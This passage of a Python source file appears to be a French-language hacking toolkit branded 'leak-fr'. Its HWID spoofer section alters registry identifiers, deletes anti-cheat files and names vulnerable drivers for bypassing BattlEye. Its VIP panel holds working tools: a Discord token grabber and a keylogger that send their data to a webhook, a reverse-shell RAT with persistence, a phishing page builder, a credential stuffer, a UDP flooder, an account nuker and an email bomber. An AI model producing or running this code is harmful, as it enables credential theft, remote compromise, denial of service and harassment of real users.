                    winreg.CloseKey(sk)
                except: pass
            winreg.CloseKey(k)
            subprocess.run(["netsh", "interface", "set", "interface", iface, "enable"], capture_output=True)
        except Exception as e: print(f"{ERR} {e}")
    pause()


def hw_vol():
    banner_s("VOLUME SERIAL")
    print(f"  {DIM}VolumeID (Sysinternals){RST}")
    print(f"  {G}volumeid C: {random.randint(0x1000, 0xFFFF):04X}-{random.randint(0x1000, 0xFFFF):04X}{RST}")
    pause()


def hw_reg():
    banner_s("REGISTRY CLEANER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    import winreg, uuid as _u
    for p, vals in [(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Setup", ["InstallationID"]),
                    (r"SOFTWARE\Microsoft\SQMClient", ["MachineId"])]:
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, p, 0, winreg.KEY_ALL_ACCESS)
            for v in vals:
                try:
                    winreg.SetValueEx(k, v, 0, winreg.REG_SZ, str(_u.uuid4()).upper()[:20])
                    print(f"  {G}[OK]{RST} {p}\\{v}")
                except: pass
            winreg.CloseKey(k)
        except: pass
    for p in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
              r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"]:
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, p, 0, winreg.KEY_ALL_ACCESS)
            try:
                while True:
                    n, _, _ = winreg.EnumValue(k, 0); winreg.DeleteValue(k, n)
            except: pass
            winreg.CloseKey(k)
            print(f"  {G}[OK]{RST} {p.split(chr(92))[-1]}")
        except: pass
    pause()


def hw_vm():
    banner_s("VM DETECTOR")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    ind = []
    try:
        o = subprocess.run(["tasklist"], capture_output=True, text=True).stdout.lower()
        for p in ["vboxservice", "vmtoolsd", "vmwaretray", "qemu-ga", "xenservice"]:
            if p in o: ind.append(f"proc: {p}")
    except: pass
    for d in ["vmmouse.sys", "vmhgfs.sys", "vboxguest.sys", "vboxmouse.sys"]:
        if os.path.isfile(os.path.join(r"C:\Windows\System32\drivers", d)): ind.append(f"drv: {d}")
    if ind:
        print(f"  {R}[VM DETECTED]{RST}")
        for i in ind: print(f"    {R}->{RST} {i}")
    else: print(f"  {G}[CLEAN]{RST}")
    pause()


def hw_ban():
    banner_s("BAN CHECKER")
    for p in [os.path.expandvars(r"%ProgramData%\EasyAntiCheat"),
              os.path.expandvars(r"%ProgramFiles%\Common Files\BattlEye"),
              os.path.expandvars(r"%LOCALAPPDATA%\BattlEye")]:
        s = f"{R}[FOUND]{RST}" if os.path.exists(p) else f"{DIM}[-]{RST}"
        print(f"  {s} {p}")
    try:
        o = subprocess.run(r'reg query "HKLM\SYSTEM\ControlSet001\Services\vgk" /v ErrorControl',
                           capture_output=True, text=True, shell=True).stdout.lower()
        if "errorcontrol" in o: print(f"  {R}[VANGUARD KERNEL ACTIVE]{RST}")
    except: pass
    pause()


def hw_be():
    banner_s("BATTLEYE GUIDE")
    print(f"""
{R}+--[ BattlEye Bypass ]-------------------+{RST}
{Y}METHODE 1 -- Soft:{RST}
{G}1.{RST} MAC + IP change
{G}2.{RST} Nouveau compte Steam
{G}3.{RST} MachineGUID + Volume Serial
{G}4.{RST} Supprimer dossier:
   {G}rmdir /s /q "%ProgramFiles%\\Common Files\\BattlEye"{RST}
{G}5.{RST} Logs:
   {G}del /f /q "%APPDATA%\\BattlEye\\*.log"{RST}

{Y}METHODE 2 -- Hard:{RST}
  Tout 1 + nouveau SID + Disk Serial + fresh install

{Y}BYOVD (driver vulnerable):{RST}
{G}  -> WinRing0x64.sys{RST}
{G}  -> RTCore64.sys{RST}
{G}  -> dbutil_2_3.sys{RST}
{G}  -> mhyprot2.sys{RST}
""")
    pause()


def hw_val():
    banner_s("VALORANT SPOOFER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    if ask("Lancer? (y/n):", "n").lower() != "y": pause(); return
    import uuid
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, str(uuid.uuid4())); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} GUID")
    except: pass
    for f in [r"C:\Program Files\Riot Vanguard", r"C:\Windows\System32\drivers\vgk.sys"]:
        if os.path.exists(f):
            try:
                if os.path.isfile(f): os.remove(f)
                else: _shutil.rmtree(f, ignore_errors=True)
                print(f"  {G}[OK]{RST} removed {f}")
            except Exception as e: print(f"  {R}[FAIL]{RST} {f}: {e}")
    print(f"\n{Y}Manual: MAC + Disk Serial + Fresh Windows + VPN{RST}")
    pause()


def hw_rbx():
    banner_s("ROBLOX SPOOFER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    c = 0
    for p in [os.path.join(os.environ.get("APPDATA", ""), "Roblox"),
              os.path.join(os.environ.get("LOCALAPPDATA", ""), "Roblox"),
              os.path.join(os.environ.get("TEMP", ""), "Roblox")]:
        if os.path.isdir(p):
            for root, dirs, files in os.walk(p):
                for f in files:
                    if any(t in f.lower() for t in ["cookies", "localstoragedb", ".log", ".dmp"]):
                        try: os.remove(os.path.join(root, f)); c += 1
                        except: pass
            print(f"  {G}[OK]{RST} {p}")
    try:
        import winreg
        for h, p in [(winreg.HKEY_CURRENT_USER, r"SOFTWARE\ROBLOX Corporation"),
                     (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\ROBLOX Corporation")]:
            try:
                k = winreg.OpenKey(h, p, 0, winreg.KEY_ALL_ACCESS)
                try:
                    while True:
                        n, _, _ = winreg.EnumValue(k, 0); winreg.DeleteValue(k, n)
                except: pass
                winreg.CloseKey(k)
            except: pass
    except: pass
    print(f"  {G}[OK]{RST} {c} fichiers")
    pause()


def hw_fn():
    banner_s("FORTNITE SPOOFER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    import uuid, winreg
    lo = os.environ.get("LOCALAPPDATA", "")
    for p in [os.path.join(lo, "EpicGamesLauncher", "Saved"), os.path.join(lo, "FortniteGame", "Saved")]:
        if os.path.isdir(p):
            for s in ["Logs", "Cache", "Crashes", "webcache"]:
                sp = os.path.join(p, s)
                if os.path.isdir(sp):
                    try: _shutil.rmtree(sp); os.makedirs(sp)
                    except: pass
            print(f"  {G}[OK]{RST} {p}")
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, str(uuid.uuid4())); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} GUID")
    except: pass
    pause()


def hw_mc():
    banner_s("MINECRAFT SPOOFER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    mc = os.path.join(os.environ.get("APPDATA", ""), ".minecraft")
    import uuid, winreg
    pp = os.path.join(mc, "launcher_profiles.json")
    if os.path.isfile(pp):
        try:
            import json as _j
            d = _j.load(open(pp, encoding="utf-8", errors="ignore"))
            if "authenticationDatabase" in d: d["authenticationDatabase"] = {}
            if "selectedUser" in d: d["selectedUser"] = {}
            _j.dump(d, open(pp, "w", encoding="utf-8"), indent=2)
            print(f"  {G}[OK]{RST} profiles")
        except: pass
    ap = os.path.join(mc, "launcher_accounts.json")
    if os.path.isfile(ap):
        try: os.remove(ap); print(f"  {G}[OK]{RST} accounts")
        except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, str(uuid.uuid4())); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} GUID")
    except: pass
    pause()


def hw_steam():
    banner_s("STEAM CLEANER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    import winreg, glob
    sp = None
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        sp, _ = winreg.QueryValueEx(k, "SteamPath"); winreg.CloseKey(k)
    except:
        for p in [r"C:\Program Files (x86)\Steam", r"C:\Program Files\Steam"]:
            if os.path.isdir(p): sp = p; break
    if sp:
        for t in ["config/loginusers.vdf", "config/config.vdf", "userdata", "logs", "dumps"]:
            for fp in glob.glob(os.path.join(sp, t)):
                try:
                    if os.path.isfile(fp): os.remove(fp)
                    else: _shutil.rmtree(fp, ignore_errors=True)
                except: pass
        print(f"  {G}[OK]{RST} Steam cleaned")
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam\Apps")
    except: pass
    pause()


def hw_dc():
    banner_s("DISCORD CLEANER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    ad = os.environ.get("APPDATA", "")
    c = 0
    for d in ["Discord", "discordptb", "discordcanary"]:
        p = os.path.join(ad, d)
        if not os.path.isdir(p): continue
        for t in ["Local Storage", "Session Storage", "Cache", "Code Cache",
                  "GPUCache", "logs", "Crashpad", "Network", "Cookies"]:
            tp = os.path.join(p, t)
            if os.path.isdir(tp):
                try: _shutil.rmtree(tp); c += 1
                except: pass
        print(f"  {G}[OK]{RST} {d}")
    print(f"  {G}[OK]{RST} {c} dossiers")
    pause()


def hw_br():
    banner_s("BROWSER CLEANER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    lo = os.environ.get("LOCALAPPDATA", "")
    t = 0
    for bn, bp in [("Chrome", os.path.join(lo, "Google", "Chrome", "User Data", "Default")),
                   ("Edge", os.path.join(lo, "Microsoft", "Edge", "User Data", "Default")),
                   ("Brave", os.path.join(lo, "BraveSoftware", "Brave-Browser", "User Data", "Default"))]:
        if not os.path.isdir(bp): continue
        for f in ["Cookies", "History", "Login Data", "Web Data", "Network", "Cache"]:
            fp = os.path.join(bp, f)
            if os.path.isfile(fp):
                try: os.remove(fp); t += 1
                except: pass
            elif os.path.isdir(fp):
                try: _shutil.rmtree(fp); t += 1
                except: pass
        print(f"  {G}[OK]{RST} {bn}")
    print(f"  {G}[OK]{RST} {t} fichiers")
    pause()


def hw_guide():
    banner_s("GUIDE SPOOF MANUEL")
    print(f"""
{R}+--[ GUIDE HWID BYPASS ]---------------------+{RST}
{Y}NIVEAU 1 -- Soft Ban{RST}
{G}1.{RST} VPN (IP differente)
{G}2.{RST} Nouveau compte + email
{G}3.{RST} Vider AppData du jeu
{G}4.{RST} Changer Machine GUID
{G}5.{RST} Changer MAC

{Y}NIVEAU 2 -- Hard Ban (EAC, BattlEye){RST}
{G}1.{RST} Tout niveau 1
{G}2.{RST} Changer Volume Serial (VolumeID)
{G}3.{RST} Changer BIOS/Disk Serial
{G}4.{RST} Nettoyer logs + prefetch
{G}5.{RST} Nouveau profil Windows

{Y}NIVEAU 3 -- Kernel Ban (Vanguard, FACEIT){RST}
{G}1.{RST} Fresh Windows install OBLIGATOIRE
{G}2.{RST} Nouvelle carte reseau / SSD
{G}3.{RST} VPN IP propre
{G}4.{RST} Nouveau compte + tel

{Y}OUTILS:{RST}
{G}->{RST} VolumeID (Sysinternals)
{G}->{RST} Technitium MAC
{G}->{RST} ProxyCap / Proxifier
{R}+---------------------------------------------+{RST}
""")
    pause()


def hwid_menu():
    while True:
        menu_box("HWID SPOOFER", [
            ("1", "Show my HWID"), ("2", "Full Fingerprint"),
            ("3", "Full Spoofer"), ("4", "Windows Identity"),
            ("5", "Random HWID"), ("6", "Disk Serial"),
            ("7", "MAC Spoofer"), ("8", "Volume Serial"),
            ("9", "Registry Cleaner"), ("10", "VM Detector"),
            ("11", "Ban Checker"), ("12", "BattlEye Guide"),
            ("13", "Valorant Spoofer"), ("14", "Roblox Spoofer"),
            ("15", "Fortnite Spoofer"), ("16", "Minecraft Spoofer"),
            ("17", "Steam Cleaner"), ("18", "Discord Cleaner"),
            ("19", "Browser Cleaner"), ("20", "Guide Manual"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": hw_show()
        elif c == "2": hw_fp()
        elif c == "3": hw_full()
        elif c == "4": hw_win()
        elif c == "5": hw_rand()
        elif c == "6": hw_disk()
        elif c == "7": hw_mac()
        elif c == "8": hw_vol()
        elif c == "9": hw_reg()
        elif c == "10": hw_vm()
        elif c == "11": hw_ban()
        elif c == "12": hw_be()
        elif c == "13": hw_val()
        elif c == "14": hw_rbx()
        elif c == "15": hw_fn()
        elif c == "16": hw_mc()
        elif c == "17": hw_steam()
        elif c == "18": hw_dc()
        elif c == "19": hw_br()
        elif c == "20": hw_guide()
        elif c == "0": break


  # ========================================================================
# VIP PANEL
# ========================================================================
def vip_tokens():
    banner_s("MASS TOKEN CHECKER")
    p = ask("Fichier .txt:")
    if not os.path.isfile(p): print(f"{ERR} Introuvable."); pause(); return
    valid = []
    for t in [l.strip() for l in open(p, errors="ignore") if l.strip()]:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t), timeout=4)
            if r.status_code == 200:
                d = r.json()
                print(f"  {G}[VALID]{RST} {d.get('username')} | {d.get('email','?')}")
                valid.append(f"{d.get('username')} | {t}")
        except: pass
        time.sleep(0.2)
    if valid: out("mass_tokens_valid.txt", "\n".join(valid))
    print(f"\n{OK} {len(valid)} valides."); pause()


def vip_nuker():
    banner_s("ACCOUNT NUKER")
    e = ask("Email:"); p = ask("Password:")
    try:
        r = requests.post("https://discord.com/api/v9/auth/login",
                          json={"login": e, "password": p, "undelete": False, "captcha_key": None},
                          headers={"Content-Type": "application/json"}, timeout=8).json()
        tk = r.get("token")
        if not tk: print(f"{ERR} Login failed."); pause(); return
        print(f"{OK} Token obtenu.")
        if ask("Type NUKE:") != "NUKE": pause(); return
        h = _dh(tk)
        for g in requests.get("https://discord.com/api/v9/users/@me/guilds", headers=h).json():
            ep = f"guilds/{g['id']}" if g.get("owner") else f"users/@me/guilds/{g['id']}"
            requests.delete(f"https://discord.com/api/v9/{ep}", headers=h); time.sleep(0.3)
        print(f"\n{OK} Nuked.")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def vip_stress():
    banner_s("IP STRESSER")
    h = ask("Target:"); p = ask_int("Port:", 80); d = ask_int("Duration:", 15); t = ask_int("Threads:", 20)
    stop = {"v": False}; c = [0]
    def fl():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); pl = random._urandom(1024)
        while not stop["v"]:
            try: s.sendto(pl, (h, p)); c[0] += 1
            except: pass
    for _ in range(t): threading.Thread(target=fl, daemon=True).start()
    try:
        e = time.time() + d
        while time.time() < e:
            print(f"\r  {G}[~]{RST} {c[0]}", end=" "); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"] = True; print(f"\n\n{OK} {c[0]}."); pause()


def vip_phish():
    banner_s("PHISHING BUILDER")
    print(f"  {Y}[1]{RST}Discord {Y}[2]{RST}Steam {Y}[3]{RST}Roblox {Y}[4]{RST}Custom")
    ch = ask("Template:", "1")
    wh = ask("Webhook:"); rd = ask("Redirect:", "https://discord.com")
    tpl = {"1": ("Discord", "#5865F2", "Login to Discord", "Email or Phone", "Password"),
           "2": ("Steam", "#1b2838", "Sign in to Steam", "Steam Account", "Password"),
           "3": ("Roblox", "#cc0000", "Login to Roblox", "Username", "Password"),
           "4": ("Custom", "#000000", "Login", "Username / Email", "Password")}
    t = tpl.get(ch, tpl["4"])
    name, color, title, f1, f2 = t
    if ch == "4":
        title = ask("Title:", "Login"); f1 = ask("Field 1:", "Username")
    html = f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>{title}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:{color};display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',sans-serif}}
.card{{background:#fff;border-radius:8px;padding:40px 36px;width:100%;max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,0.4)}}
h2{{text-align:center;color:#222;margin-bottom:24px;font-size:22px}}
label{{display:block;color:#555;font-size:13px;font-weight:600;margin-bottom:6px;text-transform:uppercase}}
input{{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:5px;font-size:15px;margin-bottom:18px;outline:none}}
button{{width:100%;padding:13px;background:{color};color:#fff;border:none;border-radius:5px;font-size:16px;font-weight:700;cursor:pointer}}
.err{{color:red;font-size:13px;text-align:center;margin-top:10px;display:none}}</style>
</head><body><div class="card"><h2>{title}</h2>
<form id="loginForm"><label for="f1">{f1}</label><input type="text" id="f1" required autocomplete="off">
<label for="f2">{f2}</label><input type="password" id="f2" required>
<button type="submit">Login</button><div class="err" id="err">Invalid credentials.</div></form></div>
<script>
const WEBHOOK = "{wh}"; const REDIRECT = "{rd}";
document.getElementById("loginForm").addEventListener("submit", async function(e) {{
    e.preventDefault();
    const v1 = document.getElementById("f1").value;
    const v2 = document.getElementById("f2").value;
    let ip = "?";
    try {{ const r = await fetch("https://api.ipify.org?format=json"); const d = await r.json(); ip = d.ip; }} catch (e) {{}}
    try {{
        await fetch(WEBHOOK, {{method: "POST", headers: {{"Content-Type": "application/json"}},
            body: JSON.stringify({{embeds: [{{title: "leak-fr phishing", color: 0xFF0000, fields: [
                {{name: "Site", value: "{name}", inline: true}},
                {{name: "IP", value: ip, inline: true}},
                {{name: "{f1}", value: v1}}, {{name: "{f2}", value: v2}}]}}]}})}});
    }} catch (e) {{}}
    document.getElementById("err").style.display = "block";
    setTimeout(() => {{window.location.href = REDIRECT;}}, 1500);
}});
</script></body></html>'''
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/phishing_{name.lower()}.html"
    open(p, "w", encoding="utf-8").write(html)
    print(f"\n{OK} -> {Y}{p}{RST}")
    print(f"  {DIM}python -m http.server 8080{RST}"); pause()


def vip_stuffer():
    banner_s("CREDENTIAL STUFFER")
    print(f"  {Y}[1]{RST}Discord {Y}[2]{RST}Roblox")
    tgt = ask("Target:", "1"); cp = ask("Combo list:")
    if not os.path.isfile(cp): print(f"{ERR} Introuvable."); pause(); return
    hits = []
    for c in [l.strip() for l in open(cp, errors="ignore") if ":" in l]:
        e, p = c.split(":", 1)
        try:
            if tgt == "1":
                r = requests.post("https://discord.com/api/v9/auth/login",
                                  json={"login": e, "password": p}, timeout=5)
                if r.status_code == 200 and r.json().get("token"):
                    print(f"  {G}[HIT]{RST} {e}:{p}"); hits.append(f"{e}:{p}")
        except: pass
        time.sleep(0.5)
    if hits: out("credential_hits.txt", "\n".join(hits))
    print(f"\n{OK} {len(hits)} hits."); pause()


def vip_proxy():
    banner_s("PROXY SCRAPER")
    all_ = set()
    for src in ["https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"]:
        try:
            for line in requests.get(src, timeout=8).text.split("\n"):
                if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}", line.strip()):
                    all_.add(line.strip())
            print(f"  {G}[OK]{RST} {src[:60]}")
        except: pass
    print(f"\n{OK} {len(all_)} proxies")
    out("proxies_all.txt", "\n".join(all_))
    if ask("Checker? (y/n):", "n").lower() == "y":
        working = []
        for proxy in list(all_)[:100]:
            try:
                r = requests.get("http://httpbin.org/ip",
                                 proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=4)
                if r.status_code == 200:
                    working.append(proxy); print(f"  {G}[WORK]{RST} {proxy}")
            except: pass
        out("proxies_working.txt", "\n".join(working))
    pause()


def vip_wh_nuke():
    banner_s("MASS WEBHOOK NUKER")
    p = ask("Fichier webhooks .txt:")
    if not os.path.isfile(p): print(f"{ERR} Introuvable."); pause(); return
    hooks = [l.strip() for l in open(p, errors="ignore") if l.strip().startswith("https://discord.com/api/webhooks")]
    mode = ask("[1]Spam [2]Del [3]Both:", "1")
    msg = ask("Message:", "leak-fr") if mode in ["1", "3"] else ""
    n = ask_int("Per webhook:", 5)
    for wh in hooks:
        if mode in ["1", "3"]:
            for _ in range(n):
                r = requests.post(wh, json={"content": msg})
                print(f"  {G if r.status_code == 204 else R}[SPAM]{RST} {r.status_code}"); time.sleep(0.3)
        if mode in ["2", "3"]:
            r = requests.delete(wh); print(f"  {R}[DEL]{RST} {r.status_code}")
    pause()


def vip_grabber():
    banner_s("GRABBER GENERATOR")
    wh = ask("Webhook:"); name = ask("Output:", "grabber.py")
    code = _GRABBER_TPL.replace("__WH__", wh)
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/{name}"; open(p, "w", encoding="utf-8").write(code)
    print(f"\n{OK} -> {Y}{p}{RST}"); _ask_exe(p); pause()


_GRABBER_TPL = '''# -*- coding: utf-8 -*-
import os, re, json, socket, platform
WH = "__WH__"
try: import requests
except Exception:
    import subprocess as sp; sp.run(["pip", "install", "requests", "--quiet"]); import requests
ad = os.environ.get("APPDATA", ""); lo = os.environ.get("LOCALAPPDATA", "")
paths = {"Discord": os.path.join(ad, "Discord", "Local Storage", "leveldb"),
         "Chrome": os.path.join(lo, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
         "Edge": os.path.join(lo, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")}
pat = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
found = []
for n, p in paths.items():
    if not os.path.isdir(p): continue
    for f in os.listdir(p):
        if not f.endswith((".log", ".ldb")): continue
        try:
            for tok in pat.findall(open(os.path.join(p, f), errors="ignore").read()):
                if tok in [t["token"] for t in found]: continue
                r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": tok}, timeout=3)
                if r.status_code == 200:
                    u = r.json()
                    found.append({"token": tok, "username": u.get("username"), "email": u.get("email", "N/A")})
        except: pass
try: ip = requests.get("https://api.ipify.org", timeout=3).text.strip()
except: ip = "?"
try: user = os.getlogin()
except: user = "?"
ts = "".join(f"**{x['username']}** | {x['email']}\\n`{x['token']}`\\n" for x in found[:5])
e = {"title": "leak-fr grabber", "color": 0xFF0000, "fields": [
    {"name": "Host", "value": socket.gethostname()}, {"name": "User", "value": user},
    {"name": "IP", "value": ip}, {"name": "Tokens", "value": ts[:1000] or "None"}]}
try: requests.post(WH, json={"embeds": [e]}, timeout=8)
except: pass
'''


def vip_rat():
    banner_s("RAT BUILDER")
    h = ask("LHOST:"); p = ask("LPORT:", "4444"); name = ask("Output:", "rat.py")
    code = _RAT_TPL.replace("__H__", h).replace("__P__", p)
    os.makedirs("1-Output", exist_ok=True)
    fp = f"1-Output/{name}"; open(fp, "w", encoding="utf-8").write(code)
    print(f"\n{OK} -> {Y}{fp}{RST}")
    print(f"  {DIM}Listener: nc -lvnp {p}{RST}"); _ask_exe(fp); pause()


_RAT_TPL = '''# -*- coding: utf-8 -*-
import os, socket, subprocess, platform, time, base64
HOST = "__H__"
PORT = __P__
def persist():
    try:
        import winreg
        s = os.path.abspath(__file__)
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'python "{{s}}"')
        winreg.CloseKey(k)
    except: pass
def screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab(); path = "_ss.png"; img.save(path)
        with open(path, "rb") as f: data = base64.b64encode(f.read()).decode()
        os.remove(path); return data
    except: return None
def shell():
    while True:
        try:
            s = socket.socket(); s.connect((HOST, PORT))
            s.send(f"[leak-fr] {{platform.node()}}\\n".encode())
            while True:
                c = s.recv(4096).decode().strip()
                if not c: continue
                if c.lower() == "exit": s.close(); break
                elif c.lower() == "sysinfo":
                    s.send(f"OS:{{platform.platform()}}\\nUser:{{os.getlogin()}}\\nHost:{{platform.node()}}\\n".encode())
                elif c.lower() == "screenshot":
                    ss = screenshot()
                    if ss: s.send(f"[SS]{{ss}}[/SS]\\n".encode())
                    else: s.send(b"failed\\n")
                else:
                    o = subprocess.run(c, shell=True, capture_output=True, timeout=15)
                    s.send(o.stdout + o.stderr or b"(no output)\\n")
        except: time.sleep(5)
persist()
shell()
'''


def vip_qr():
    banner_s("QR PHISHING")
    try: import qrcode
    except: _pip("qrcode[pil]"); import qrcode
    url = ask("URL:"); name = ask("Output:", "qr_phishing")
    os.makedirs("1-Output", exist_ok=True)
    qr = qrcode.QRCode(version=1, box_size=10, border=4); qr.add_data(url); qr.make(fit=True)
    qr.make_image(fill_color="black", back_color="white").save(f"1-Output/{name}.png")
    print(f"\n{OK} -> 1-Output/{name}.png"); pause()


def vip_tinfo():
    banner_s("MASS TOKEN INFO")
    p = ask("Fichier .txt:")
    if not os.path.isfile(p): print(f"{ERR} Introuvable."); pause(); return
    res = []
    for t in [l.strip() for l in open(p, errors="ignore") if l.strip()]:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t), timeout=4)
            if r.status_code == 200:
                d = r.json()
                gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(t), timeout=3).json()
                gc = len(gs) if isinstance(gs, list) else 0
                print(f"  {G}[VALID]{RST} {d.get('username')} guilds:{gc}")
                res.append(f"{d.get('username')} | {t}")
        except: pass
        time.sleep(0.3)
    if res: out("mass_token_info.txt", "\n".join(res))
    pause()


def vip_rbx():
    banner_s("ROBLOX COOKIE CHECKER")
    p = ask("Fichier cookies .txt:")
    if not os.path.isfile(p): print(f"{ERR} Introuvable."); pause(); return
    v = []
    for ck in [l.strip() for l in open(p, errors="ignore") if l.strip()]:
        try:
            h = {"Cookie": f".ROBLOSECURITY={ck}"}
            r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h, timeout=5)
            if r.status_code == 200:
                d = r.json(); uid = d.get("id")
                rb = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=h).json()
                print(f"  {G}[HIT]{RST} {d.get('name')} robux:{rb.get('robux', 0)}")
                v.append(f"{d.get('name')} | {ck}")
        except: pass
        time.sleep(0.3)
    if v: out("roblox_hits.txt", "\n".join(v))
    pause()


def vip_ipscan():
    banner_s("MASS IP SCANNER")
    import ipaddress
    cidr = ask("CIDR:", "192.168.1.0/24"); port = ask_int("Port:", 80)
    try:
        hosts = list(ipaddress.ip_network(cidr, strict=False).hosts())
        found = []
        for ip in hosts:
            s = socket.socket(); s.settimeout(0.5)
            if s.connect_ex((str(ip), port)) == 0:
                print(f"  {G}[OPEN]{RST} {ip}:{port}"); found.append(f"{ip}:{port}")
            s.close()
        if found: out(f"mass_scan_{cidr.replace('/','_')}.txt", "\n".join(found))
    except Exception as e: print(f"{ERR} {e}")
    pause()


def vip_email():
    banner_s("EMAIL BOMBER")
    e = ask("Email:"); n = ask_int("Count:", 10)
    sent = 0
    for i in range(1, n + 1):
        for url, data in [("https://app.mailjet.com/signup", {"email": e}),
                          ("https://account.mail.ru/signup", {"Login": e})]:
            try: requests.post(url, data=data, timeout=3); sent += 1
            except: pass
        print(f"  {Y}[{i}/{n}]{RST}"); time.sleep(0.5)
    print(f"\n{OK} {sent} requetes."); pause()


def vip_keylog():
    banner_s("KEYLOGGER BUILDER")
    wh = ask("Webhook:"); name = ask("Output:", "keylogger.py")
    code = _KEYLOG_TPL.replace("__WH__", wh)
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/{name}"; open(p, "w", encoding="utf-8").write(code)
    print(f"\n{OK} -> {Y}{p}{RST}")
    print(f"  {DIM}pip install pynput{RST}"); _ask_exe(p); pause()


_KEYLOG_TPL = '''# -*- coding: utf-8 -*-
import time, threading, socket, os
WH = "__WH__"
try: import requests
except Exception:
    import subprocess as sp; sp.run(["pip", "install", "requests", "--quiet"]); import requests
buf = []
def on_k(k):
    try:
        from pynput.keyboard import Key
        if k == Key.space: buf.append(" ")
        elif k == Key.enter: buf.append("\\n")
        elif k == Key.backspace: buf.append("[BKSP]")
        elif k == Key.tab: buf.append("[TAB]")
        elif hasattr(k, "char") and k.char: buf.append(k.char)
        else: buf.append(f"[{{k}}]")
    except: pass
def sender():
    while True:
        time.sleep(30)
        if not buf: continue
        t = "".join(buf); buf.clear()
        try: u = os.getlogin()
        except: u = "?"
        e = {"title": "leak-fr keylogger", "color": 0xFF0000, "fields": [
            {"name": "Host", "value": socket.gethostname()},
            {"name": "User", "value": u}, {"name": "Keys", "value": f"```{t[:1000]}```"}]}
        try: requests.post(WH, json={"embeds": [e]}, timeout=5)
        except: pass
def main():
    try: from pynput import keyboard
    except:
        import subprocess as sp; sp.run(["pip", "install", "pynput", "--quiet"])
        from pynput import keyboard
    threading.Thread(target=sender, daemon=True).start()
    with keyboard.Listener(on_press=on_k) as l: l.join()
main()
'''


def vip_webhook_info():
    banner_s("WEBHOOK INFO + TEST")
    wh = ask("URL webhook:")
    print()
    d = jget(wh)
    if not isinstance(d, dict) or "error" in d: print(f"{ERR} Invalide."); pause(); return
    for k, v in [("Name", d.get("name")), ("ID", d.get("id")),
                 ("Channel", d.get("channel_id")), ("Guild", d.get("guild_id"))]:
        print(f"  {Y}{k:<10}{RST} {W}{v}{RST}")
    if ask("Envoyer un embed test? (y/n):", "n").lower() == "y":
        try:
            r = requests.post(wh, json={"embeds": [{"title": "leak-fr test", "color": 0xFF0000,
                "description": "Webhook operationnel.", "timestamp": datetime.utcnow().isoformat() + "Z"}]}, timeout=5)
            print(f"{OK if r.status_code in [200, 204] else ERR} {r.status_code}")
        except Exception as e: print(f"{ERR} {e}")
    pause()


def vip_sniper():
    banner_s("NITRO SNIPER")
    t = ask("Token (pour snatch):"); n = ask_int("Duree (sec):", 60)
